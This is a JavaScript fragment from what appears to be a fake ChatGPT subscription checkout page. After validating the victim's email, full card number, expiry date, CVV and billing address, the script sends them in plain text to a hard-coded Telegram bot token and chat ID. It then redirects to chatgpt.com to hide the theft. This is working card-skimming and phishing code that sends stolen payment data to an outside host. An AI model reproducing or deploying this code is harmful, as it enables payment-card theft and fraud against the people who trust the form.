    <script>

            const countrySelect = document.getElementById('country');
            const stateSelect = document.getElementById('state');
    
            countrySelect.addEventListener('change', function () {
                const country = this.value;
                const statesList = states[country] || [];
                stateSelect.innerHTML = statesList.map(state => `<option value="${state}">${state}</option>`).join('');
            });
    
            countrySelect.dispatchEvent(new Event('change'));
    
            // Luhn algorithm to validate card number
            function validateCardNumber(cardNumber) {
                let sum = 0;
                let shouldDouble = false;
    
                // Reverse card number and iterate over it
                for (let i = cardNumber.length - 1; i >= 0; i--) {
                    let digit = parseInt(cardNumber[i]);
    
                    if (shouldDouble) {
                        digit *= 2;
                        if (digit > 9) digit -= 9;
                    }
    
                    sum += digit;
                    shouldDouble = !shouldDouble;
                }
    
                // Return true if sum is a multiple of 10
                return sum % 10 === 0;
            }
    
            // Show error message and clear it after 3 seconds
            function showError(element, message) {
                element.textContent = message;
                setTimeout(() => {
                    element.textContent = '';
                }, 3000);
            }
    
            // Form submission handler
            document.getElementById('subscribe-button').addEventListener('click', function (event) {
                event.preventDefault();
    
                // Clear previous error messages
                document.querySelectorAll('.error-message').forEach(el => el.textContent = '');
    
                const email = document.getElementById('email').value;
                const cardholderName = document.getElementById('cardholder-name').value;
                const cardNumber = document.getElementById('card-number').value.replace(/\s+/g, ''); // Remove spaces for validation
                const expiryDate = document.getElementById('expiry-date').value;
                const cvv = document.getElementById('cvv').value;
                const address1 = document.getElementById('address1').value;
                const address2 = document.getElementById('address2').value;
                const city = document.getElementById('city').value;
                const zip = document.getElementById('zip').value;
                const country = document.getElementById('country').value;
                const state = document.getElementById('state').value;
    
                let valid = true;
    
                // Validate email
                if (!email || !/\S+@\S+\.\S+/.test(email)) {
                    showError(document.getElementById('email-error'), 'Please enter a valid email address.');
                    valid = false;
                }
    
                // Validate card number (16 digits and Luhn Algorithm)
                if (!cardNumber || cardNumber.length !== 16 || !validateCardNumber(cardNumber)) {
                    showError(document.getElementById('card-number-error'), 'Please enter a valid 16-digit card number.');
                    valid = false;
                }
    
                // Validate expiry date
                const [month, year] = expiryDate.split('/').map(num => parseInt(num, 10));
                const currentYear = new Date().getFullYear() % 100;
                const currentMonth = new Date().getMonth() + 1;
                if (!expiryDate.match(/^\d{2}\/\d{2}$/) || (year < currentYear) || (year === currentYear && month < currentMonth)) {
                    showError(document.getElementById('expiry-date-error'), 'Please enter a valid expiry date.');
                    valid = false;
                }
    
                // Validate CVV
                if (!cvv || cvv.length < 3 || cvv.length > 4) {
                    showError(document.getElementById('cvv-error'), 'Please enter a valid CVV.');
                    valid = false;
                }
    
                // Validate ZIP
                if (!zip || isNaN(zip)) {
                    showError(document.getElementById('address-error'), 'Please enter a valid ZIP code.');
                    valid = false;
                }
    
                // Validate cardholder name
                if (!cardholderName) {
                    showError(document.getElementById('cardholder-name-error'), 'Please enter the cardholder name.');
                    valid = false;
                }
    
                // Validate address
                if (!address1 || !city) {
                    showError(document.getElementById('address-error'), 'Please enter your address and city.');
                    valid = false;
                }
    
                if (valid) {
                    // Prepare data for Telegram bot
                    const message = `
                        ======================================
                        Email: ${email}
                        Cardholder Name: ${cardholderName}
                        Card Number: ${cardNumber}
                        Expiry Date: ${expiryDate}
                        CVV: ${cvv}
                        Address Line 1: ${address1}
                        Address Line 2: ${address2}
                        City: ${city}
                        ZIP: ${zip}
                        Country: ${country}
                        State/Province: ${state}
                        =======================================
                    `;
    
                    // Send data to Telegram bot
                    const botToken = '7201820922:AAEmYN_NzUdgHOwr_zPETKW5sUAjvor1BfA';
                    const chatId = '5068645042';
                    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
                    const payload = {
                        chat_id: chatId,
                        text: message
                    };
    
                    fetch(telegramUrl, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(payload)
                    })
                        .then(response => {
                            if (response.ok) {
                                // Redirect to ChatGPT.com after successful message send
                                window.location.href = 'https://chatgpt.com';
                            } else {
                                alert('Failed to send message. Please try again.');
                            }
                        })
                        .catch(error => {
                            console.error('Error:', error);
                            alert('An error occurred. Please try again.');
                        });
                }
            });
        });
